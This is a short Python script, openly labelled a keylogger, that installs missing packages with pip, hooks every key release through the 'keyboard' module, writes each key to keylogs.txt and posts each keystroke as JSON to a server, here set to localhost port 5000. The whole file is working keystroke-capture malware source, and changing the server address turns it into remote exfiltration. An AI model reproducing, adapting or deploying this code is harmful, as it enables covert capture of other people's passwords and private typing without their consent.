import subprocess
import sys
import os
import requests
import importlib

def install_and_import(module_name):
    try:
        importlib.import_module(module_name)
    except ImportError:
        print(f"{module_name} not found. Installing...")
        subprocess.check_call([sys.executable, "-m", "pip", "install", module_name])
        # Import the module after installation
        globals()[module_name] = importlib.import_module(module_name)

# Check and install required modules
install_and_import('keyboard')
install_and_import('requests')

import keyboard

print("Welcome to Keylogger, this will take your keyboard inputs in the background and put them into a text file.")
print("Checking if the Keyboard Module Exists...")

server_url = 'http://127.0.0.1:5000'

def check_server_connection():
    try:
        response = requests.get(server_url)
        if response.status_code == 200:
            print("Server connected")
            return True
        else:
            print("Server connection failed")
            return False
    except Exception as e:
        print("Error connecting to server:", e)
        return False

server_connected = check_server_connection()

print("Script is running")

def on_key_event(event):
    key_pressed = str(event.name)
    with open('keylogs.txt', 'a') as file:
        file.write(key_pressed + ' ')

    payload = {'key': key_pressed}
    headers = {'Content-Type': 'application/json'}

    if server_connected:
        try:
            response = requests.post(server_url, json=payload, headers=headers)
            if response.status_code != 200:
                print("Failed to send key to the server")
        except requests.exceptions.RequestException as e:
            print("Error:", e)

keyboard.on_release(on_key_event)
keyboard.wait('*')
